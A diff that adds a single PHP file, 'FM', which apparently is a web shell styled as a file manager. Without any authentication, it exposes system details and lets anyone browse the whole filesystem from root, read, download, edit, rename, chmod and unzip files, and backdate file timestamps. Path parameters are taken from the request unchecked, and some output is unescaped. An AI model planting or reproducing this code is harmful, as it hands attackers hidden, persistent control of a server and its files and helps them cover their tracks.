@@ -1,0 +1,362 @@
+<?php
+session_start();
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+class FileManager {
+    private $currentPath;
+    private $rootPath;
+    private $defaultPath;
+
+    public function __construct() {
+        $this->defaultPath = dirname(__FILE__);
+        $this->rootPath = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? substr($_SERVER['DOCUMENT_ROOT'], 0, 3) : '/';
+        $this->currentPath = isset($_GET['path']) ? ($_GET['path'] === '/' ? $this->rootPath : $this->securePath($_GET['path'])) : $this->defaultPath;
+    }
+    public function securePath($path) {
+        $path = str_replace('\\', '/', $path);
+        if ($path === '/' || empty($path)) return $this->rootPath;
+        $fullPath = substr($path, 0, 1) === '/' ? $this->rootPath . $path : $this->currentPath . '/' . $path;
+        return ($realPath = realpath($fullPath)) ? str_replace('\\', '/', $realPath) : $this->defaultPath;
+    }
+    public function downloadFile($path) {
+        $fullPath = $this->rootPath . '/' . ltrim($path, '/');
+        if (file_exists($fullPath) && is_file($fullPath)) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($fullPath) . '"');
+            header('Content-Length: ' . filesize($fullPath));
+            readfile($fullPath);
+            exit;
+        }
+        return false;
+    }
+
+    public function getFileContent($path) {
+        try {
+            $fullPath = $this->rootPath . '/' . ltrim($path, '/');
+            if (!($realPath = realpath($fullPath)) || !is_file($realPath) || !is_readable($realPath)) throw new Exception("File error");
+            return file_get_contents($realPath);
+        } catch (Exception $e) {
+            return "Error: " . $e->getMessage();
+        }
+    }
+    public function getFileTime($path) {
+        return date('Y-m-d\TH:i', @filemtime($this->rootPath . '/' . ltrim($path, '/')));
+    }
+    public function listDirectory() {
+        try {
+            if (!is_dir($this->currentPath)) return ['directories' => [], 'files' => []];
+            $items = scandir($this->currentPath) ?: [];
+            $files = $directories = [];
+            foreach ($items as $item) {
+                if ($item === '.' || ($item === '..' && $this->currentPath === $this->rootPath)) continue;
+                $itemPath = $this->currentPath . '/' . $item;
+                try {
+                    $relativePath = ltrim($itemPath, '/');
+                    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($itemPath))['name'] : @fileowner($itemPath);
+                    $group = function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($itemPath))['name'] : @filegroup($itemPath);
+                    $info = [
+                        'name' => $item,
+                        'path' => $relativePath,
+                        'size' => is_file($itemPath) ? @filesize($itemPath) : 0,
+                        'perms' => substr(sprintf('%o', @fileperms($itemPath)), -4),
+                        'mtime' => date('Y-m-d H:i:s', @filemtime($itemPath)),
+                        'owner' => $owner,
+                        'group' => $group
+                    ];
+                    is_dir($itemPath) ? $directories[] = $info : $files[] = $info;
+                } catch (Exception $e) {
+                    continue;
+                }
+            }
+            return ['directories' => $directories, 'files' => $files];
+        } catch (Exception $e) {
+            return ['directories' => [], 'files' => []];
+        }
+    }
+    public function handleActions() {
+        if (!isset($_POST['action'])) return;
+        switch ($_POST['action']) {
+            case 'chmod': $this->chmod($_POST['path'], $_POST['mode']); break;
+            case 'rename': $this->rename($_POST['oldname'], $_POST['newname']); break;
+            case 'touch': $this->touch($_POST['path'], $_POST['timestamp']); break;
+            case 'edit_file': $this->saveFile($_POST['path'], $_POST['content']); break;
+            case 'create_file': $this->createFile($_POST['name']); break;
+            case 'create_folder': $this->createFolder($_POST['name']); break;
+            case 'unzip':
+                $result = $this->unzipFile($_POST['path']);
+                if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
+                    header('Content-Type: application/json');
+                    echo json_encode($result);
+                    exit;
+                }
+                break;
+        }
+    }
+    private function chmod($path, $mode) {
+        chmod($this->rootPath . '/' . ltrim($path, '/'), octdec($mode));
+    }
+
+    private function rename($oldName, $newName) {
+        rename($this->currentPath . '/' . $oldName, $this->currentPath . '/' . $newName);
+    }
+
+    private function touch($path, $timestamp) {
+        touch($this->rootPath . '/' . ltrim($path, '/'), strtotime($timestamp));
+    }
+
+    private function saveFile($path, $content) {
+        try {
+            $fullPath = $this->rootPath . '/' . ltrim($path, '/');
+            if (!($realPath = realpath($fullPath)) || !is_file($realPath) || !is_writable($realPath)) throw new Exception("File write error");
+            file_put_contents($realPath, $content);
+        } catch (Exception $e) {
+            throw new Exception("Save error: " . $e->getMessage());
+        }
+    }
+
+    private function createFile($name) {
+        $path = $this->currentPath . '/' . $name;
+        if (!file_exists($path)) file_put_contents($path, '');
+    }
+
+    private function createFolder($name) {
+        $path = $this->currentPath . '/' . $name;
+        if (!file_exists($path)) mkdir($path);
+    }
+
+    private function unzipFile($path) {
+        try {
+            if (!class_exists('ZipArchive')) throw new Exception("ZIP extension not installed");
+            $fullPath = $this->rootPath . '/' . ltrim($path, '/');
+            if (!($realPath = realpath($fullPath)) || strpos($realPath, $this->rootPath) !== 0) throw new Exception("Invalid path");
+            if (!file_exists($realPath) || !is_readable($realPath)) throw new Exception("File not readable");
+
+            $zip = new ZipArchive();
+            if ($zip->open($realPath) !== true) throw new Exception("Cannot open ZIP");
+            $extractPath = dirname($realPath);
+            if (!$zip->extractTo($extractPath)) throw new Exception("Extract failed");
+            $zip->close();
+            return ['success' => true, 'message' => "Extracted successfully"];
+        } catch (Exception $e) {
+            return ['success' => false, 'message' => "ZIP error: " . $e->getMessage()];
+        }
+    }
+
+    public function getCurrentPath() {
+        return str_replace('\\', '/', $this->currentPath);
+    }
+}
+
+function formatSize($size) {
+    if ($size == 0) return '0 B';
+    $base = log($size) / log(1024);
+    $suffixes = ['B', 'KB', 'MB', 'GB'];
+    return round(pow(1024, $base - floor($base)), 2) . ' ' . $suffixes[floor($base)];
+}
+
+$sysInfo = [
+    'uname' => php_uname(),
+    'user' => get_current_user(),
+    'group' => function_exists('posix_getgrgid') ? posix_getgrgid(posix_getgid())['name'] : 'unknown',
+    'php' => phpversion(),
+    'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
+    'total_space' => round(disk_total_space("/") / (1024*1024*1024), 2),
+    'free_space' => round(disk_free_space("/") / (1024*1024*1024), 2),
+    'used_percent' => round((disk_free_space("/") / disk_total_space("/")) * 100),
+    'cwd' => getcwd()
+];
+
+$fileManager = new FileManager();
+$fileManager->handleActions();
+$items = $fileManager->listDirectory();
+$currentPath = $fileManager->getCurrentPath();
+
+if (isset($_GET['action'])) {
+    switch($_GET['action']) {
+        case 'get_content': echo $fileManager->getFileContent($_GET['path']); exit;
+        case 'download': $fileManager->downloadFile($_GET['path']); exit;
+        case 'get_time': echo $fileManager->getFileTime($_GET['path']); exit;}
+}
+?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>FM</title>
+        <style>
+            body{background:#171717;color:#fff;font-family:monospace;margin:0;padding:0;font-size:12px}
+            a{    text-decoration: none;}
+            .system-info{background:#222;padding:5px;border-bottom:1px solid#333}
+            .system-line{margin:2px 0}
+            .value{color:#fff}
+            .path{color:#9f0}
+            .dir-link{color:#09f;text-decoration:none}
+            .dir-link:hover{text-decoration:underline}
+            .actions{margin-top:5px;display:flex;gap:5px}
+            .tools{padding:5px 10px;background:#222;border-bottom:1px solid#333}
+            .btn{background:#333;color:#9f0;border:none;padding:3px 8px;cursor:pointer;margin-right:5px}
+            .btn:hover{background:#444}
+            .btn-primary{background:#06c}
+            .btn-upload{background:#60c}
+            .btn-new{background:#09f}
+            .btn-new-folder{background:#0c6}
+            .fm-table{width:100%;border-collapse:collapse}
+            .fm-table td,.fm-table th{padding:3px 5px;border:1px solid#333;text-align:left}
+            .folder{color:#ff0;text-decoration:none}
+            .file{color:#fff;cursor:pointer}
+            .perm{color:#9f0}
+            .content-area{padding:10px;background:#222;min-height:calc(100vh - 150px);display:flex;flex-direction:column}
+            .content-area textarea{width:100%;flex-grow:1;background:#333;color:#fff;border:1px solid#444;padding:5px;font-family:monospace;height: 400px;}
+            .datetime{background:#333;color:#fff;border:1px solid#444;padding:3px;margin-right:10px}
+            .hex-content{font-family:monospace;white-space:pre;overflow-x:auto;color:#9f0}
+            .highlight pre{background:#333;padding:10px;margin:0;white-space:pre-wrap}
+            .view-content{flex-grow:1;background:#333;padding:10px;overflow:auto;white-space:pre-wrap}
+            .safe-on{color:#9f0}
+            .safe-off{color:red}
+            .hidden{display:none}
+            .actions {
+                white-space: nowrap;
+            }
+            .action-link {
+                color: #9f0;
+                text-decoration: none;
+                margin: 0 1px;
+                cursor: pointer;
+            }
+            .action-link:hover {
+                color: #fff;
+            }
+        </style>
+    </head>
+<body>
+    <div class="system-info">
+        <div class="system-line">Uname: <span class="value"><?php echo $sysInfo['uname']; ?></span></div>
+        <div class="system-line">
+            User: <span class="value"><?php echo $sysInfo['user']; ?> (<?php echo $sysInfo['group']; ?>)</span>
+            Php: <span class="value"><?php echo $sysInfo['php']; ?> Safe mode:
+                <span class="<?php echo $sysInfo['safe_mode'] == 'ON' ? 'safe-on' : 'safe-off'; ?>"><?php echo $sysInfo['safe_mode']; ?></span>
+            </span>
+        </div>
+        <div class="system-line">Hdd: <span class="value"><?php echo $sysInfo['total_space']; ?> GB Free: <?php echo $sysInfo['free_space']; ?> GB (<?php echo $sysInfo['used_percent']; ?>%)</span></div>
+        <div class="system-line">Cwd: <span class="path"><?php echo $sysInfo['cwd']; ?></span></div>
+        <div class="system-line">Dir: <span class="path">
+            <?php
+            $parts = explode('/', trim($currentPath, '/'));
+            $buildPath = '';
+            echo '<a href="?path=/" class="dir-link">Root</a>';
+            foreach ($parts as $part) {
+                if (empty($part)) continue;
+                $buildPath .= '/' . $part;
+                echo ' / <a href="?path=' . htmlspecialchars($buildPath) . '" class="dir-link">' . htmlspecialchars($part) . '</a>';
+            }
+            echo ' <a href="?path=' . htmlspecialchars($sysInfo['cwd']) . '" class="path">[HOME]</a>';
+            ?>
+        </span></div>
+        <div class="actions">
+            <button class="btn btn-primary" onclick="location.href='?path=<?php echo $currentPath; ?>'">→</button>
+            <button class="btn btn-upload" onclick="document.getElementById('fileInput').click()">⇑ Upload</button>
+            <input type="file" id="fileInput" multiple class="hidden" onchange="uploadFiles(this.files)">
+            <button class="btn btn-new" onclick="createFile()">New File</button>
+            <button class="btn btn-new-folder" onclick="createFolder()">New Folder</button>
+        </div>
+    </div>
+
+    <div id="toolsArea" class="tools" style="display:none">
+        <div id="fileTools"></div>
+        <div id="dirTools" style="display:none">
+            <button class="btn" onclick="showChmodForm()">Chmod</button>
+            <button class="btn" onclick="showRenameForm()">Rename</button>
+            <button class="btn" onclick="showTouchForm()">Touch</button>
+        </div>
+    </div>
+
+    <div id="contentArea" class="content-area" style="display:none"></div>
+
+<div class="main" id="fileManager">
+    <table class="fm-table">
+    <tr><th>Name</th><th>Size</th><th>Modified</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>
+<?php foreach ($items['directories'] as $item): ?>
+    <tr>
+    <?php if ($item['name'] === '..'): ?>
+        <td><a href="?path=<?php echo dirname($currentPath); ?>" class="folder">[..]</a></td>
+    <?php else: ?>
+        <td><a href="?path=<?php echo $item['path']; ?>" class="folder">[<?php echo htmlspecialchars($item['name']); ?>]</a></td>
+    <?php endif; ?>
+        <td>dir</td>
+        <td><?php echo $item['mtime']; ?></td>
+        <td><?php echo htmlspecialchars($item['owner']); ?>/<?php echo htmlspecialchars($item['group']); ?></td>
+        <td class="perm">
+            <a href="#" onclick="performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>', 'C', 'dir')" class="action-link">
+                <?php echo $item['perms']; ?>
+            </a>
+        </td>
+        <td>
+            <?php if ($item['name'] !== '..'): ?>
+                <a href="#" onclick="performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>', 'R', 'dir')" class="action-link">R</a>
+                <a href="#" onclick="performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>', 'T', 'dir')" class="action-link">T</a>
+            <?php endif; ?>
+        </td>
+    </tr>
+<?php endforeach; ?>
+
+        <?php foreach ($items['files'] as $item): ?>
+            <?php
+            $isZip = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)) === 'zip';
+            $actions = $isZip ? 'DERTX' : 'DERT';
+            ?>
+            <tr>
+                <td><a href="javascript:performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>','E');" class="file"><?php echo htmlspecialchars($item['name']); ?></a></td>
+                <td><?php echo formatSize($item['size']); ?></td>
+                <td><?php echo $item['mtime']; ?></td>
+                <td><?php echo htmlspecialchars($item['owner']); ?>/<?php echo htmlspecialchars($item['group']); ?></td>
+                <td class="perm">
+                    <a href="#" onclick="performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>', 'C', 'file')" class="action-link">
+                    <?php echo $item['perms']; ?>
+                    </a>
+                </td>
+                <td>
+                    <?php foreach (str_split($actions) as $action): ?>
+                        <a href="#" onclick="performAction('<?php echo $item['path']; ?>', '<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $action; ?>')" class="action-link"><?php echo $action; ?></a>
+                    <?php endforeach; ?>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+    </table>
+</div>
+
+    <script>
+        let currentFile="",currentName="",currentType="";function showFileTools(e,t){currentFile=e,currentName=t,currentType="file";let n=t.split(".").pop().toLowerCase(),o=`
+            <button class="btn" onclick="downloadFile()">Download</button>
+            <button class="btn" onclick="showContent('hexdump')">Hexdump</button>
+            <button class="btn" onclick="showContent('edit')">Edit</button>
+            <button class="btn" onclick="showChmodForm()">Chmod</button>
+            <button class="btn" onclick="showRenameForm()">Rename</button>
+            <button class="btn" onclick="showTouchForm()">Touch</button>
+        `;"zip"===n&&(o+=`<button class="btn" onclick="unzipFile('${e}')">Extract</button>`),document.getElementById("fileTools").innerHTML=o,document.getElementById("fileTools").style.display="block",document.getElementById("dirTools").style.display="none",document.getElementById("toolsArea").style.display="block"}function showDirTools(e,t){currentFile=e,currentName=t,currentType="dir",document.getElementById("fileTools").style.display="none",document.getElementById("dirTools").style.display="block",document.getElementById("toolsArea").style.display="block",document.getElementById("contentArea").style.display="none",document.getElementById("fileManager").style.display="block"}async function showContent(e){let t=document.getElementById("contentArea");t.style.display="block",document.getElementById("fileManager").style.display="none";try{let n=await fetch(`?action=get_content&path=${encodeURIComponent(currentFile)}`),o=await n.text(),a='<div class="tools"><button class="btn" onclick="backToList()">Back</button></div>';switch(e){case"hexdump":a+=`<div class="hex-content">${hexdump(o)}</div>`;break;case"edit":var l;a+=`
+                    <textarea id="editor">${o.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;")}</textarea>
+                    <div class="tools">
+                        <button class="btn" onclick="saveFile()">Save</button>
+                    </div>
+                `,loadFileTime()}t.innerHTML=a}catch(c){t.innerHTML="Error loading content"}}function hexdump(e){let t=new TextEncoder().encode(e),n="";for(let o=0;o<t.length;o+=16){let a=t.slice(o,o+16),l=Array.from(a).map(e=>e.toString(16).padStart(2,"0")).join(" "),c=Array.from(a).map(e=>e>=32&&e<=126?String.fromCharCode(e):".").join("");n+=`${o.toString(16).padStart(8,"0")}  ${l.padEnd(48," ")}  |${c}|
+`}return n}async function loadFileTime(){try{let e=await fetch(`?action=get_time&path=${encodeURIComponent(currentFile)}`);document.getElementById("fileTime").value=await e.text()}catch(t){}}function showChmodForm(){let e=document.getElementById("contentArea");e.style.display="block",document.getElementById("fileManager").style.display="none",e.innerHTML=`
+            <div class="tools">
+                <button class="btn" onclick="backToList()">Back</button>
+                <input type="text" class="datetime" id="chmodValue" placeholder="0644">
+                <button class="btn" onclick="changeChmod()">Change</button>
+            </div>
+        `}function showRenameForm(){let e=document.getElementById("contentArea");e.style.display="block",document.getElementById("fileManager").style.display="none",e.innerHTML=`
+            <div class="tools">
+                <button class="btn" onclick="backToList()">Back</button>
+                <input type="text" class="datetime" id="newName" value="${currentName}">
+                <button class="btn" onclick="renameItem()">Rename</button>
+            </div>
+        `}function showTouchForm(){let e=document.getElementById("contentArea");e.style.display="block",document.getElementById("fileManager").style.display="none",e.innerHTML=`
+            <div class="tools">
+                <button class="btn" onclick="backToList()">Back</button>
+                <input type="datetime-local" id="touchTime" class="datetime">
+                <button class="btn" onclick="touchItem()">Change</button>
+            </div>
+        `,loadFileTime()}function backToList(){document.getElementById("contentArea").style.display="none",document.getElementById("toolsArea").style.display="none",document.getElementById("fileManager").style.display="block"}async function changeFileTime(){let e=document.getElementById("fileTime").value,t=new FormData;t.append("action","touch"),t.append("path",currentFile),t.append("timestamp",e);try{await fetch(window.location.href,{method:"POST",body:t}),alert("Time updated")}catch(n){alert("Error updating time")}}async function changeChmod(){let e=document.getElementById("chmodValue").value,t=new FormData;t.append("action","chmod"),t.append("path",currentFile),t.append("mode",e);try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error changing permissions")}}async function renameItem(){let e=document.getElementById("newName").value,t=new FormData;t.append("action","rename"),t.append("oldname",currentName),t.append("newname",e);try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error renaming")}}async function touchItem(){let e=document.getElementById("touchTime").value,t=new FormData;t.append("action","touch"),t.append("path",currentFile),t.append("timestamp",e);try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error changing time")}}async function createFile(){let e=prompt("Filename:");if(!e)return;let t=new FormData;t.append("action","create_file"),t.append("name",e);try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error creating file")}}async function createFolder(){let e=prompt("Folder name:");if(!e)return;let t=new FormData;t.append("action","create_folder"),t.append("name",e);try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error creating folder")}}async function uploadFiles(e){let t=new FormData;t.append("action","upload"),Array.from(e).forEach(e=>t.append("files[]",e));try{await fetch(window.location.href,{method:"POST",body:t}),window.location.reload()}catch(n){alert("Error uploading")}}function downloadFile(){window.location.href=`?action=download&path=${encodeURIComponent(currentFile)}`}async function saveFile(){let e=document.getElementById("editor").value,t=new FormData;t.append("action","edit_file"),t.append("path",currentFile),t.append("content",e);try{await fetch(window.location.href,{method:"POST",body:t}),alert("Saved")}catch(n){alert("Error saving")}}async function unzipFile(e){if(!confirm("Extract?"))return;let t=new FormData;t.append("action","unzip"),t.append("path",e);try{let n=await fetch(window.location.href,{method:"POST",body:t}),o=await n.json();o.success?window.location.reload():alert(o.message)}catch(a){alert("Error extracting")}}function performAction(e,t,n,o="file"){switch("file"===o?showFileTools(e,t):showDirTools(e,t),n){case"D":downloadFile();break;case"E":showContent("edit");break;case"C":showChmodForm();break;case"R":showRenameForm();break;case"T":showTouchForm();break;case"X":unzipFile(e)}event.preventDefault()}    </script>
+</body>
+</html>
